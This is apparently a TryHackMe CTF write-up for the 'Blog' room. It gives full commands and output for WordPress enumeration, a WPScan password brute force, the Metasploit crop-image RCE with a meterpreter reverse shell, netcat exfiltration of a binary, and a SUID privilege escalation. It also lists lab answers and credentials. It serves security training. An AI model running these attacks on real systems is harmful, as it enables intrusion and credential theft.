<p align="center">
  THM : Blog<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/blog<br>
  <img src="https://i.imgur.com/0uqrcEp.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Wordpress brute-force](#wordpress-brute-force)
- [Exploiting wordpress](#exploiting-wordpress)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's start an agressive [nmap](https://nmap.org/) scan against the target to find out what ports are open :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-16 15:24 CEST
Nmap scan report for blog.thm (10.10.252.181)
Host is up (0.072s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-10-16T13:25:10+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-16T13:25:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.71 seconds
```

- The SSH port is open (port 22)
- There is a webserver running on the target (port 80)
- The SMB service is running on the target (ports 139 and 445), so we may find SMB shares with useful informations (or not).

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [WPScan enumeration](#wpscan-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

We can run a [Gobuster](https://github.com/OJ/gobuster) scan to find interesting files and directories :  
```
attacker@AttackBox:~/Documents/THM/CTF/Blog$ gobuster dir -u http://blog.thm/ -w /opt/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/16 15:30:15 Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://blog.thm/0/]
/feed                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
/atom                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/atom/]
/wp-content           (Status: 301) [Size: 309] [--> http://blog.thm/wp-content/]
/welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/w                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
/n                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
/rss2                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
/wp-includes          (Status: 301) [Size: 310] [--> http://blog.thm/wp-includes/]
/no                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
/N                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
/W                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
/rdf                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://blog.thm/]
/Welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
/'                    (Status: 301) [Size: 0] [--> http://blog.thm/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/note                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
/%20                  (Status: 301) [Size: 0] [--> http://blog.thm/]
/we                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
/2020                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/]
Progress: 6955 / 220561 (3.15%)^C
[!] Keyboard interrupt detected, terminating.
```

You can notice a redirect to "/wp-admin", and other redirects to "/wp-content"... This means that it's a wordpress blog. We will use another 
tool to enumerate this wordpress blog, so I stopped the [Gobuster](https://github.com/OJ/gobuster) scan.

**Question : What CMS was Billy using ?**  
**Answer : Wordpress**  

### WPScan enumeration

Since we know it's a wordpress blog, we can use [WPScan](https://github.com/wpscanteam/wpscan) to find more useful informations :  
```
attacker@AttackBox:~/Documents/THM/CTF/Blog$ wpscan --url http://blog.thm/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.thm/ [10.10.252.181]
[+] Started: Sun Oct 16 15:46:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===============> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Oct 16 15:46:24 2022
[+] Requests Done: 186
[+] Cached Requests: 7
[+] Data Sent: 43.333 KB
[+] Data Received: 19.266 MB
[+] Memory used: 286.926 MB
[+] Elapsed time: 00:00:09
```

Now we know that the wordpress version currently installed on the machine is 5.0.  

**Question : What version of the above CMS was being used ?**  
**Answer : 5.0**  

### Manual enumeration

We will try to get some usernames to try brute-forcing the wordpress login page. Let's take 
a look at the index page of the website :  
![](https://i.imgur.com/DYS1EOz.jpg)  

You can notice a post made by Karen Wheeler, we can click on the author name of this post and get the username by looking at the URL :  
![](https://i.imgur.com/uOPxfvM.jpg)  

## Wordpress brute-force

Now that we have a username, we can try to brute-force it using wpscan :  
```
attacker@AttackBox:~/Documents/THM/CTF/Blog$ wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel
...
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                
Trying kwheel / daddyyankee Time: 00:01:11 <         > (2865 / 14347259)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
...
...
```

We have now valid credentials to log into the wordpress panel !

## Exploiting wordpress

By searching for exploits on Wordpress 5.0 using [Exploit-DB](https://www.exploit-db.com/), we can find an exploit that 
leads to a RCE (Remote Code Execution) by uploading a malicious image containing a payload 
written in php :  
![](https://i.imgur.com/E7Hpc6g.jpg)  

It's a [Metasploit](https://www.metasploit.com/) module, so we will start msfconsole and load it :  
```
msf6 > search Wordpress Crop

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/wp_crop_rce) > set LPORT 4242
LPORT => 4242
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:hos
                                         t:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid
                                         7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4242             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
RHOSTS => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.14.31.20:4242 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.252.181
[*] Meterpreter session 1 opened (10.14.31.20:4242 -> 10.10.252.181:51048) at 2022-10-16 17:47:03 +0200
[*] Attempting to clean up files...

meterpreter >
```

And we have a meterpreter shell !

## Privilege escalation

Fist, I spawned a basic shell using "shell", and then I stabilized it.

It's time to elevate our privileges, first, I checked the crontab, if www-data has sudo rights, I searched for ssh private keys... but I did not find anything like that. But I found an 
unknown SUID binary named "checker" located in /usr/sbin. Let's see what happen if we try to run it :  
```
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
www-data@blog:/$ 
```

It tells us we are not admin. But the question is : How this binary check if we are admin or not ?  
So I downloaded this binary on my local machine using netcat :  

On my local machine :  
```
nc -l -p 1234 > checker
```

On the target machine :  
```
nc -w 3 10.14.31.20 1234 < /usr/sbin/checker
```

Then, I opened this binary with [Ghidra](https://ghidra-sre.org/) :  
![](https://i.imgur.com/xKJgxQk.jpg)  

The program checks if the environment variable "admin" is equal to 0, if it is, the program spawns a root shell. So we just have to use `export admin=0` on the target machine and try to 
execute the program again :  
```
www-data@blog:/$ export admin=0
export admin=0
www-data@blog:/$ /usr/sbin/checker 
/usr/sbin/checker
root@blog:/#
```

We are root ! Time to get the flags !  

The user flag is located in an uncommon directory, "/media/usb" :  
```
root@blog:/# cd /media/usb
cd /media/usb
root@blog:/media/usb# ls
ls
user.txt
root@blog:/media/usb# cat user.txt
cat user.txt
****************************
```

**Question : Where was user.txt found ?**  
**Answer : /media/usb**  

**Question : user.txt**  
**Answer : HIDDEN**  

The root flag is located in /root :  
```
root@blog:/media/usb# cd /root
cd /root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
************************
```

**Question : root.txt**  
**Answer : HIDDEN**  

## Conclusion

I liked this CTF, the privilege escalation was original in my opinion. This CTF contains website enumeration and exploitation, brute-forcing, and reverse engineering. Thanks for this room ! 
And thanks for reading my write ups !
